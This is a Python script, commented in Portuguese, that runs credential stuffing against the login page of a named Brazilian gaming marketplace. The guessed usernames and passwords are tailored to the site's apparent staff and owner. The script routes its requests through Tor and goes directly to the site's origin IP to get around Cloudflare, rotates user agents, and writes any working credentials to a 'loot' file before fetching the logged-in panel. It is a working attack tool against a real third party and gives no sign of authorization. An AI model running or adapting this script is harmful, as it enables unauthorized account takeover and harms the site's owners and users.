#!/usr/bin/env python3
"""
/login credential stuffing — desapegogames.com.br via bypass CF (.54)
Campos: login + senha. Sem reCAPTCHA, sem WAF (bypass CF).
Detecao de sucesso: HTTP 302/303 (redirect) OU body sem "não confere".
Nao-destrutivo: apenas valida login.
"""
import sys, time, random, requests, urllib3
urllib3.disable_warnings()
PROXY={"https":"socks5h://127.0.0.1:9050","http":"socks5h://127.0.0.1:9050"}
URL="https://186.226.60.54/login"
HOSTH="desapegogames.com.br"
UAS=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"]

USERNAMES = [
    "administrador","adminv","dev1ce","devaashe","masterx",
    "diegobtrindade","desapegostore","diego047","diegodg","diegoccl",
    "admin","root","diego","trindade","master","modmotta","donout",
    "diegoaveline","diegoslv","diegovbb","diegoluanxd","super123",
]
PASSWORDS = [
    "Desapego@2024","Desapego@2023","Desapego@2022","desapego2024","desapego2023",
    "desapego123","Desapego123","DesapegoGames","desapegogames","desapegogames123",
    "Diego@2024","Diego@2023","diego123","Diego123","Diego2024","diego2024",
    "diegobtrindade","Trindade123","trindade","Trindade@2024",
    "admin","admin123","Admin@123","Admin123","administrador",
    "123456","12345678","123456789","1234567890","password","Password1",
    "P@ssw0rd","qwerty","abc123","letmein","welcome","welcome1",
    "iloveyou","monkey","dragon","master","shadow","trustno1",
    "654321","111111","000000","12345","1234","123","1","pass","pass123",
    "desapego!","Desapego2024","Desapego2023","desapego!2024",
    "DesapegoGames@2024","Desapego@2024!","DesapegoGames123",
    "desapegogames@2024","desapegogames!","Desapegogames@2024",
    "diego!2024","Diego!2024","diego_desapego","Diego@desapego",
    "masterx","masterx123","Masterx123","MasterX",
    "dev1ce","dev1ce123","Dev1ce123",
    "desapego","desapego1","desapego12","desapego2025","Desapego@2025",
    "changepassword","mudar123","Mudar@123","senha123","Senha@123",
]

FAIL_MARKERS_B = [b"confere", b"nao confere", b"incorret", b"invalid"]  # bytes, encoding-agnostic
PANEL_MARKERS_B = [b"/painel", b"/sair", b"logout", b"minha conta", b"/notificacoes",
                   b"bem-vindo", b"bem vindo", b"Logado", b"Sair", b"saldo", b"transacoes"]

def is_success(status, location, body_b):
    if status in (302,303,307,308) and location and "/login" not in location.lower():
        return True
    if status==200:
        if not any(m in body_b for m in FAIL_MARKERS_B):
            # checar se tem painel/logado
            if any(s in body_b for s in PANEL_MARKERS_B):
                return True
    return False

def try_one(user, pw):
    sess=requests.Session()
    sess.proxies.update(PROXY)
    h={"Host":HOSTH,"User-Agent":random.choice(UAS)}
    try:
        r0=sess.get(URL,headers=h,verify=False,timeout=30)
    except Exception as e:
        return None, f"GET exc {type(e).__name__}"
    h2={"Host":HOSTH,"User-Agent":random.choice(UAS),
        "Referer":URL,"Origin":"https://186.226.60.54","Content-Type":"application/x-www-form-urlencoded"}
    try:
        r=sess.post(URL,headers=h2,data={"login":user,"senha":pw},verify=False,timeout=30,allow_redirects=False)
    except Exception as e:
        return None, f"POST exc {type(e).__name__}"
    loc=r.headers.get("Location","")
    body_b=r.content[:3000]
    ok=is_success(r.status_code,loc,body_b)
    return ok, f"HTTP {r.status_code} loc={loc[:50]!r} fail_msg={b'confere' in body_b}"

def main():
    out="enum/login_credstuff.log"
    f=open(out,"w")
    def log(m): print(m,flush=True); f.write(m+"\n"); f.flush()
    log(f"[*] /login cred stuffing — {len(USERNAMES)} users × {len(PASSWORDS)} passes = {len(USERNAMES)*len(PASSWORDS)} tentativas")
    log(f"[*] via Tor SOCKS5, bypass CF .54")
    tried=0
    for user in USERNAMES:
        for pw in PASSWORDS:
            tried+=1
            ok,info=try_one(user,pw)
            tag="*** SUCCESS ***" if ok else ""
            log(f"  [{tried:04d}] {user!r:25s}:{pw!r:25s} → {info} {tag}")
            if ok:
                log(f"\n[+] **** LOGIN SUCCESS /login **** user={user!r} pw={pw!r}")
                with open("loot/creds.txt","a") as cf:
                    cf.write(f"/login (painel usuario) | {user}:{pw} | https://186.226.60.54/login (Host: {HOSTH})\n")
                with open("loot/access.txt","a") as af:
                    af.write(f"painel usuario logado | user={user} pw={pw} | {URL}\n")
                # tentar acessar /painel
                try:
                    sess=requests.Session(); sess.proxies.update(PROXY)
                    h={"Host":HOSTH,"User-Agent":random.choice(UAS)}
                    sess.post(URL,headers=h,data={"login":user,"senha":pw},verify=False,timeout=30,allow_redirects=True)
                    rp=sess.get("https://186.226.60.54/painel",headers=h,verify=False,timeout=30,allow_redirects=True)
                    open("enum/login_panel_after.html","w").write(rp.text)
                    log(f"[+] /painel após login: HTTP {rp.status_code} len={len(rp.text)} salvo")
                except Exception as e:
                    log(f"  /painel exc: {e}")
                f.close()
                return 0,user,pw
            time.sleep(random.uniform(1.2,2.5))
    log(f"\n[-] Nenhuma cred funcionou em /login ({tried} tentativas)")
    f.close()
    return 1,None,None

if __name__=="__main__":
    rc,u,p=main()
    sys.exit(rc)
